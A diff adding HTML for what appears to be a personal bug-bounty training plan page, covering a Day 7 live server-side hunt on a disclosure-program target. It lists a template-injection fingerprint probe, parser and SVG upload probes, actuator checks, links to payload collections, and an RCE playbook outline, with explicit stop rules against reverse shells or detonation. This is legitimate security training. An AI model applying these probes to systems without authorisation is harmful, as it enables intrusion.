+<ul class="chk">
+<li><input type="checkbox" id="w07d6c0"><label for="w07d6c0"><b>0:00–0:15</b> — wrappers + encodings</label></li>
+<li><input type="checkbox" id="w07d6c1"><label for="w07d6c1"><b>0:15–1:05</b> — wrapper matrix (lab)</label></li>
+<li><input type="checkbox" id="w07d6c2"><label for="w07d6c2"><b>1:05–2:00</b> — 2 disagreement points</label></li>
+<li><input type="checkbox" id="w07d6c3"><label for="w07d6c3"><b>2:00–2:35</b> — differential log + table</label></li>
+<li><input type="checkbox" id="w07d6c4"><label for="w07d6c4"><b>2:35–3:00</b> — wrapper recited + gaps</label></li>
+<li><input type="checkbox" id="w07d6c5"><label for="w07d6c5"><b>Proof</b> — matrix + log archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Two parsers, one input = bug farm.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('6')">📋 Copy day</button><button class="btn" onclick="openDayLinks('6')">🔗 Open links</button><button class="btn" onclick="resetDay('6')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-7" data-day="7">
+<button class="day-head" onclick="toggleDay('day-7')"><span>Day 7 — Live server-side hunt (stack-routed, stop on critical)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-7">
+<div class="timer">Real 180 min · critical = reproduce + stop + 24h</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> Stack→class routing recall</p>
+<p class="t-act">Route your VDP stack (Jinja2→profile fields, Spring→actuators, XML/SVG→upload, Java ser→OOB). Check <b>HuntBook stack-routing headings ONLY</b>.</p>
+<div class="t-links"><a href="https://github.com/su6osec/Bug-Bounty-Hunting-Methodology-2026" target="_blank" rel="noopener">HuntBook: stack routing</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Routing table for live target.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Engine/parser/upload probes with baselines (VDP, gentle)</p>
+<p class="t-act">Probe <b><code>{{7*7}}</code> fingerprint (read-only render check) + parser Content-Type swap + upload SVG probe (no XXE detonation) + actuator GETs</b>. Baselines each. <b>No reverse-shells, no deserialization detonation, no actuator shutdown.</b></p>
+<div class="t-links"><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">PortSwigger: safe fingerprint</a><a href="https://book.hacktricks.xyz/pentesting-web/spring-boot-actuators" target="_blank" rel="noopener">HackTricks: safe actuator GETs</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>X</h4><p>Accounts: @orange_8361 for SSTI threads (read-only today).</p><h4>Done-when</h4><p>Probes + baselines, no DoS/detonation.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Same-stack CVE disclosures (2)</p>
+<p class="t-act">Read <b>H1 hacktivity same-stack (SSTI/XXE/Spring) 2 — injection point + fingerprint ONLY</b>. Compare your probe coverage.</p>
+<div class="t-links"><a href="https://hackerone.com/hacktivity" target="_blank" rel="noopener">H1: same-stack search</a><a href="https://github.com/ajaysenr/HackerOne-Disclosed-Reports" target="_blank" rel="noopener">H1: mirror</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>2 patterns + coverage gap.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> RCE playbook update + candidate triage (stop rule armed)</p>
+<p class="t-act">Update playbook (fingerprint→escape→OOB). Triage: OOB/callback = keep + stop; silent = log + move. <b>If critical fires: freeze, screenshot callback, 24h report.</b></p>
+<div class="t-links"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" rel="noopener">PATT: RCE playbook rows</a><a href="https://github.com/rodnt/PortSwiggerLabs" target="_blank" rel="noopener">Community: lab solutions by topic (attempt first)</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Playbook + triage + stop-rule armed.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> RCE triage test + gaps to Week 08</p>
+<p class="t-act">Recite triage + stop rule. Assign gaps (fetch/SSRF sinks) to Week 08.</p>
+<div class="t-links"><a href="https://github.com/su6osec/Bug-Bounty-Hunting-Methodology-2026" target="_blank" rel="noopener">HuntBook: triage + stop</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + archive + assignments.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w07d7c0"><label for="w07d7c0"><b>0:00–0:15</b> — stack routing table</label></li>
+<li><input type="checkbox" id="w07d7c1"><label for="w07d7c1"><b>0:15–1:05</b> — gentle probes + baselines (no boom)</label></li>
+<li><input type="checkbox" id="w07d7c2"><label for="w07d7c2"><b>1:05–2:00</b> — 2 same-stack patterns</label></li>
+<li><input type="checkbox" id="w07d7c3"><label for="w07d7c3"><b>2:00–2:35</b> — playbook + triage (stop armed)</label></li>
+<li><input type="checkbox" id="w07d7c4"><label for="w07d7c4"><b>2:35–3:00</b> — triage + gaps to W08</label></li>
+<li><input type="checkbox" id="w07d7c5"><label for="w07d7c5"><b>Proof</b> — probes + playbook archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Fingerprint on live, detonate in lab.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('7')">📋 Copy day</button><button class="btn" onclick="openDayLinks('7')">🔗 Open links</button><button class="btn" onclick="resetDay('7')">↺ Reset</button></div>
+</div></div>
+
+<footer style="color:var(--text-soft);margin-top:1.5rem;font-size:.83rem">RCE proofs stay in lab. Live = fingerprint + OOB ping max, then stop + 24h. Surprise: Log4Shell/Text4Shell/SnakeYAML are EL-family — your SpEL notes already cover the shape.</footer>
+</div></main>
+<footer class="site-footer"><div class="inner"><div class="left"><span class="mark">&gt;</span> sayed_ · bug hunter plan</div><div class="links"><a href="/index.html">Posts</a><a href="/about.html">About</a><a href="/keendork/keendork.html">Dorks</a><a href="/bugbounty-plan/index.html">Plan</a><a href="mailto:s4youud@gmail.com">Email</a></div></div></footer>
+<script src="js/plan.js"></script>
+</body>
+</html>
